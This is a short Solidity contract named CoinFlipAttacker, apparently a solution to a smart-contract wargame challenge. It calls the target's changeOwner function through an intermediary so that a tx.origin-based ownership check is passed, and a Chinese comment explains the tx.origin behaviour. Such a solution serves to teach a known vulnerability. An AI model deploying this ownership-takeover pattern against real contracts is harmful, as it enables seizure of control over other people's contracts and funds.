/**
 *Submitted for verification at Etherscan.io on 2022-05-21
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.3;

interface ICoinFlipChallenge {
    function changeOwner(address newOwner) external payable returns (bool);
}

contract CoinFlipAttacker {


    string public name;
    ICoinFlipChallenge public challenge;
    address public msgSender;
    address public txOrigin;

    constructor(address challengeAddress) {
        name = 'CoinFlipAttacker';
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    // 0. tx.origin 指向原始交易的 tx.from (即对原始交易签名的地址)
    function changeCoinFlipOwner() external payable {
        msgSender = msg.sender; 
        txOrigin = tx.origin; 
        challenge.changeOwner(tx.origin);
    }

    receive() external payable {}

}